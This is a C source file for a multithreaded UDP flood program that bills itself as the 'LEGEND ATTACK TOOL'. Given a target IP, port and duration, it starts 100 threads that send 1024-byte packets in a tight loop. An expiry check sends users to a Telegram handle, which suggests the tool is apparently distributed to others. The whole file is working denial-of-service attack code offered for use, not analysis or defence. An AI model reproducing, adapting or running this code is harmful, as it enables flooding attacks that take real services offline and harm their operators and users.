#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <libgen.h>
#include <time.h>

#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 12
#define EXPIRY_DAY 30

// Default Values
#define DEFAULT_BYTE_SIZE 1024
#define DEFAULT_THREADS 100

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int byte_size;
    int thread_id;
} program_params;

volatile int keep_running = 1;

// Expiry Check
int check_expiry() {
    time_t t = time(NULL);
    struct tm *current = localtime(&t);
    
    int current_date = (current->tm_year + 1900) * 10000 + (current->tm_mon + 1) * 100 + current->tm_mday;
    int expiry_date = EXPIRY_YEAR * 10000 + EXPIRY_MONTH * 100 + EXPIRY_DAY;

    if (current_date > expiry_date) {
        printf("\n[BINARY EXPIRED] Contact Telegram: @LEGENDXOPL\n");
        return 0;
    }
    return 1;
}

// Signal Handler
void handle_signal(int signal) {
    keep_running = 0;
}

// UDP Attack Function
void *process_network(void *arg) {
    program_params *params = (program_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address: %s\n", params->target_ip);
        close(sock);
        return NULL;
    }

    message = (char *)malloc(params->byte_size);
    if (message == NULL) {
        close(sock);
        return NULL;
    }
    memset(message, 'A', params->byte_size);

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, params->byte_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    free(message);
    close(sock);
    return NULL;
}

// Print Banner
void print_banner() {
    printf("\n[ LEGEND ATTACK TOOL ]\n");
}

// Main Function
int main(int argc, char *argv[]) {
    print_banner();
    if (!check_expiry()) return 1;

    // Input Parsing
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int byte_size = DEFAULT_BYTE_SIZE;
    int thread_count = DEFAULT_THREADS;

    // Validate input
    if (target_port <= 0 || target_port > 65535 || duration <= 0) {
        printf("Invalid input values!\n");
        return 1;
    }

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Allocate threads
    pthread_t threads[thread_count];
    program_params params[thread_count];

    printf("Starting attack on %s:%d | Duration: %d sec | Bytes: %d | Threads: %d\n", target_ip, target_port, duration, byte_size, thread_count);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].byte_size = byte_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, process_network, &params[i]) != 0) {
            printf("Thread creation failed\n");
            return 1;
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[ Attack Complete ]\n");
    return 0;
}
